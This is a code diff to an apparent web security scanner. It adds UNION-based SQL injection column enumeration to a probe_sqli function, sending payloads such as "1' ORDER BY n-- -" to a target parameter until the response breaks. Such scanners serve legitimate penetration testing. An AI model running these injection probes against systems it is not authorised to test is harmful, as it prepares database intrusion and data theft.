@@ -121,7 +121,7 @@ def probe_reflection(ctx: Context, url: str, param: str,
 
 
 def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
-               data: str | None = None) -> dict:
+               data: str | None = None, union_cols: int = 0) -> dict:
     tool = "probe_sqli"
     base = _send(ctx, url, param, "1", method, data, tool, "baseline")
     quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
@@ -172,7 +172,7 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
         verdict = "boolean-blind candidate (numeric OR pair)"
         signal = (f"unquoted OR true/false similarity={nosim}, statuses "
                   f"{notrue_r['status']}/{nofalse_r['status']}")
-    return {
+    out = {
         "verdict": verdict,
         "signal": signal,
         "request_ids": {k: r["request_id"] for k, r in pairs},
@@ -183,6 +183,34 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
         "numeric_or_true_false_similarity": nosim,
         "note": "confirm before record_finding: reproduce the difference and quote the differing bytes",
     }
+    # opt-in ORDER BY enumeration: the first n that errors or empties the
+    # page bounds the column count - the number a UNION SELECT must match
+    if union_cols > 0:
+        # pick the frag family that parsed earlier: on a quoted context the
+        # unquoted ORDER BY lands inside the string and always "fails";
+        # on a numeric context the quoted frag breaks n=1 immediately
+        numeric_ctx = verdict == "boolean-blind candidate (numeric context)" \
+            or (nsim < 0.85 or nstatus_diff) and sim >= 0.85
+        frag = (lambda n: f"1 ORDER BY {n}-- -") if numeric_ctx \
+            else (lambda n: f"1' ORDER BY {n}-- -")
+        cols, trace = None, []
+        for n in range(1, min(int(union_cols), 30) + 1):
+            rr = _send(ctx, url, param, frag(n), method, data, tool,
+                       f"orderby-{n}")
+            rbody = rr.get("body") or ""
+            failed = bool(SQL_ERRORS.search(rbody)) or \
+                rr["status"] >= 400 or \
+                _similarity(rbody, bodies["base"]) < 0.5
+            trace.append({"n": n, "request_id": rr["request_id"],
+                          "failed": failed})
+            if failed:
+                cols = n - 1
+                break
+        out["union"] = {"columns": cols, "context": "numeric" if numeric_ctx
+                        else "quoted", "trace": trace,
+                        "note": "column count for UNION SELECT; verify "
+                                "with UNION SELECT NULL,... before citing"}
+    return out
 
 
 def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
